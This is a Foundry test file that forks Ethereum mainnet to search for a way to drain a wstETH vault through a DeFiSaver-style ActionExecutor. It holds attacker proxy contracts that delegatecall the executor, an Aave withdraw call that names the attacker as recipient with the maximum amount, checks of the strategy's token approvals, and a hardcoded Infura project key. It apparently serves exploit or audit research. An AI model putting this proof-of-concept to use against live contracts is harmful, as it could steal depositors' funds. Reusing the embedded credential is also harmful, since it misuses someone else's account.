// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IActionExecutor {
    function executeActions(
        bytes4[] calldata _actionIds,
        bytes[] calldata _actionCallData,
        uint8[][] calldata _paramMapping
    ) external payable;
}

interface IActionRegistry {
    function getAddr(bytes4 _id) external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IAavePool {
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IWstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function getStETHByWstETH(uint256 _wstETHAmount) external view returns (uint256);
}

contract DeepActionAnalysis is Test {
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant ACTION_REGISTRY = 0x94aF5994EB6841e1D930C95AD0C9F89771c3073F;
    
    // Key actions
    bytes4 constant AAVE_WITHDRAW_ID = 0x72a6498a;
    bytes4 constant AAVE_SUPPLY_ID = 0xfc33bf00;
    bytes4 constant VAULT_PULL_ID = 0xfebcb52a;
    bytes4 constant LIDO_UNWRAP_ID = 0xacd039ef;
    bytes4 constant LIDO_WRAP_ID = 0x43142355;
    bytes4 constant LIDO_STAKE_ID = 0xd7e40b2d;
    
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    // stETH removed - checksum issue
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeAaveWithdrawAction() public view {
        console.log("=== ANALYZING AAVE WITHDRAW ACTION ===\n");
        
        address aaveWithdrawAction = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_WITHDRAW_ID);
        console.log("AaveV3Withdraw action:", aaveWithdrawAction);
        
        // Get bytecode and analyze
        bytes memory code = aaveWithdrawAction.code;
        console.log("Code size:", code.length);
        
        // Check if it has any storage reads that could be exploited
        // The action likely does: aavePool.withdraw(asset, amount, to)
        // Where "to" might be controllable
    }
    
    function test_AnalyzeVaultPullAction() public view {
        console.log("=== ANALYZING VAULT PULL ACTION ===\n");
        
        address vaultPullAction = IActionRegistry(ACTION_REGISTRY).getAddr(VAULT_PULL_ID);
        console.log("VaultPull action:", vaultPullAction);
        
        bytes memory code = vaultPullAction.code;
        console.log("Code size:", code.length);
    }

    function test_ExploitViaParamMapping() public {
        console.log("=== TESTING PARAM MAPPING EXPLOITATION ===\n");
        
        // In DeFiSaver, paramMapping allows:
        // 0 = use direct param
        // 1-255 = use return value from action at that index
        // Special values for address(this), msg.sender, etc.
        
        // What if we can make an action return attacker's address
        // and use it as the "to" parameter in another action?
        
        vm.startPrank(attacker);
        
        // Deploy an attacker proxy that mimics Strategy interface
        AttackerProxy proxy = new AttackerProxy(VAULT, attacker, wstETH);
        console.log("Attacker proxy:", address(proxy));
        
        // The proxy has:
        // - vault() returns real vault
        // - strategyStorage() returns something
        
        // Now try to execute actions through this proxy
        // If we can call ActionExecutor via delegatecall from our proxy...
        
        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);
        
        // Try calling AaveWithdraw with attacker as "to"
        // The action parameters for AaveV3Withdraw are likely:
        // (address asset, uint256 amount, address to, uint256 useDefaultMarket, bytes memory nullAddr)
        
        bytes memory aaveWithdrawData = abi.encode(
            wstETH,           // asset
            type(uint256).max, // amount (max = all)
            attacker,         // to - THIS IS THE KEY!
            0,                // useDefaultMarket
            address(0)        // nullAddr
        );
        
        bytes4[] memory actionIds = new bytes4[](1);
        actionIds[0] = AAVE_WITHDRAW_ID;
        
        bytes[] memory actionCalldata = new bytes[](1);
        actionCalldata[0] = aaveWithdrawData;
        
        uint8[][] memory paramMapping = new uint8[][](1);
        paramMapping[0] = new uint8[](5);
        // All zeros = use direct params
        
        // Execute through proxy via delegatecall
        bytes memory executeData = abi.encodeWithSelector(
            IActionExecutor.executeActions.selector,
            actionIds,
            actionCalldata,
            paramMapping
        );
        
        try proxy.execute(ACTION_EXECUTOR, executeData) returns (bytes32 result) {
            console.log("Execute succeeded!");
            console.logBytes32(result);
        } catch Error(string memory reason) {
            console.log("Execute failed:", reason);
        } catch (bytes memory lowLevelData) {
            console.log("Execute failed (low level):");
            console.logBytes(lowLevelData);
        }
        
        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);
        uint256 proxyATokenBalance = IERC20(aWstETH).balanceOf(address(proxy));
        
        console.log("\n--- Results ---");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);
        console.log("Proxy aWstETH:", proxyATokenBalance / 1e18);
        
        vm.stopPrank();
    }
    
    function test_CheckStrategyTokenApprovals() public view {
        console.log("=== CHECKING STRATEGY 0 TOKEN APPROVALS ===\n");
        
        // Strategy 0 likely has approvals to various protocols
        // These are set when actions run in Strategy context
        
        address[] memory tokens = new address[](3);
        tokens[0] = wstETH;
        tokens[1] = aWstETH;
        // tokens[2] = stETH; removed
        
        address[] memory spenders = new address[](10);
        spenders[0] = AAVE_POOL;
        spenders[1] = wstETH;  // For wrap/unwrap
        spenders[2] = address(0); // stETH removed
        spenders[3] = VAULT;
        spenders[4] = ACTION_EXECUTOR;
        spenders[5] = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_WITHDRAW_ID);
        spenders[6] = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_SUPPLY_ID);
        spenders[7] = IActionRegistry(ACTION_REGISTRY).getAddr(VAULT_PULL_ID);
        spenders[8] = IActionRegistry(ACTION_REGISTRY).getAddr(LIDO_UNWRAP_ID);
        spenders[9] = IActionRegistry(ACTION_REGISTRY).getAddr(LIDO_WRAP_ID);
        
        for (uint t = 0; t < tokens.length; t++) {
            console.log("\nToken:", tokens[t]);
            for (uint s = 0; s < spenders.length; s++) {
                if (spenders[s] == address(0)) continue;
                uint256 allowance = IERC20(tokens[t]).allowance(STRATEGY_0, spenders[s]);
                if (allowance > 0) {
                    console.log("  Approved spender:", spenders[s]);
                    console.log("  Allowance:", allowance);
                    if (allowance == type(uint256).max) {
                        console.log("  *** MAX APPROVAL ***");
                    }
                }
            }
        }
    }
    
    function test_DSProxyExploitPath() public {
        console.log("=== DS PROXY EXPLOIT PATH ===\n");
        
        // The key insight: DeFiSaver's ActionExecutor is designed to work with DSProxy
        // Anyone can deploy a DSProxy and call actions through it
        // The actions run in the proxy's context
        
        // But there's a twist: some actions might read from address(this)
        // thinking it's a Strategy, but it's actually the attacker's proxy
        
        vm.startPrank(attacker);
        
        // Create a proxy that returns controlled values
        ControlledProxy proxy = new ControlledProxy();
        
        // Configure the proxy to return specific values
        proxy.setVault(VAULT);  // Make vault() return real vault
        proxy.setWstETH(wstETH);
        
        // Give proxy some tokens if needed
        // (In real attack, might use flash loan)
        
        console.log("Controlled proxy deployed:", address(proxy));
        console.log("proxy.vault():", proxy.vault());
        
        // Now if an action calls IStrategy(address(this)).vault()
        // it would get the real vault address!
        
        // Check what VaultPull does:
        // It likely calls: vault.withdrawToStrategy(strategyId, amount)
        // But strategyId might be controllable...
        
        vm.stopPrank();
    }
    
    function test_AnalyzeActionReturn() public view {
        console.log("=== ANALYZING ACTION RETURN VALUES ===\n");
        
        // Actions return bytes32 which can be used by subsequent actions
        // via paramMapping
        
        // If we can make action 1 return attacker's address
        // and action 2 uses that as transfer destination...
        
        // What actions return user-controllable values?
        // - AaveWithdraw might return the withdrawn amount
        // - VaultPull might return something
        
        // Check action signatures by looking at their code
        address[] memory actions = new address[](6);
        actions[0] = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_WITHDRAW_ID);
        actions[1] = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_SUPPLY_ID);
        actions[2] = IActionRegistry(ACTION_REGISTRY).getAddr(VAULT_PULL_ID);
        actions[3] = IActionRegistry(ACTION_REGISTRY).getAddr(LIDO_UNWRAP_ID);
        actions[4] = IActionRegistry(ACTION_REGISTRY).getAddr(LIDO_WRAP_ID);
        actions[5] = IActionRegistry(ACTION_REGISTRY).getAddr(LIDO_STAKE_ID);
        
        string[6] memory names = ["AaveWithdraw", "AaveSupply", "VaultPull", "LidoUnwrap", "LidoWrap", "LidoStake"];
        
        for (uint i = 0; i < actions.length; i++) {
            console.log("\n", names[i], ":", actions[i]);
            if (actions[i] != address(0)) {
                console.log("  Code size:", actions[i].code.length);
            }
        }
    }
}

contract AttackerProxy {
    address public vault;
    address public owner;
    address public token;
    
    constructor(address _vault, address _owner, address _token) {
        vault = _vault;
        owner = _owner;
        token = _token;
    }
    
    function execute(address _target, bytes memory _data) external payable returns (bytes32 response) {
        require(msg.sender == owner, "Not owner");
        
        assembly {
            let succeeded := delegatecall(gas(), _target, add(_data, 0x20), mload(_data), 0, 32)
            response := mload(0)
            
            switch succeeded
            case 0 {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }
        }
    }
    
    // Mimic Strategy interface
    function strategyStorage() external pure returns (address) {
        return address(0);
    }
    
    receive() external payable {}
}

contract ControlledProxy {
    address private _vault;
    address private _wstETH;
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
    }
    
    function setVault(address v) external {
        require(msg.sender == _owner);
        _vault = v;
    }
    
    function setWstETH(address w) external {
        require(msg.sender == _owner);
        _wstETH = w;
    }
    
    function vault() external view returns (address) {
        return _vault;
    }
    
    function execute(address _target, bytes memory _data) external payable returns (bytes32 response) {
        require(msg.sender == _owner, "Not owner");
        
        assembly {
            let succeeded := delegatecall(gas(), _target, add(_data, 0x20), mload(_data), 0, 32)
            response := mload(0)
            
            switch succeeded
            case 0 {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }
        }
    }
    
    receive() external payable {}
}
